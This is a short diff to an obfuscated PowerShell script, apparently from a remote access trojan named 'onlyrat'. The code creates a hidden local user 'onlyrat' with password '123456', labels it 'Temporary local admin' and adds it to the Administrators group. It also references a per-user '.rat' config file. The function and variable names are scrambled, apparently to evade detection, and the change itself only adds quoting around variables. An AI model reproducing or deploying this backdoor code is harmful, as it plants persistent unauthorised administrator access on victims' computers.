@@ -22,7 +22,7 @@ function nQjUmBRylz{
 
     }
     process{
-        New-LocalUser -Name $jrTWzPgQwA -Password $oXGjuyUVQW -Description "Temporary local admin"
+        New-LocalUser -Name "$jrTWzPgQwA" -Password "$oXGjuyUVQW" -Description "Temporary local admin"
         Write-verbose "$jrTWzPgQwA local user created"
         Add-LocalGroupMember -Group "Administrators" -Member "$jrTWzPgQwA"
         Write-verbose "$jrTWzPgQwA added to the local administrator group"
@@ -36,8 +36,8 @@ Remove-LocalUser -Name "onlyrat"
 # Create local admin
 $jrTWzPgQwA="onlyrat"
 $lUWMsSTQXg="123456"
-$oXGjuyUVQW = (ConvertTo-securestring $lUWMsSTQXg -AsPlainText -Force)
-nQjUmBRylz -jrTWzPgQwA $jrTWzPgQwA -oXGjuyUVQW $oXGjuyUVQW
+$oXGjuyUVQW = (ConvertTo-securestring "$lUWMsSTQXg" -AsPlainText -Force)
+nQjUmBRylz -jrTWzPgQwA "$jrTWzPgQwA" -oXGjuyUVQW "$oXGjuyUVQW"
 # config file
 $LFBzkROvGc="$env:UserName.rat"
 
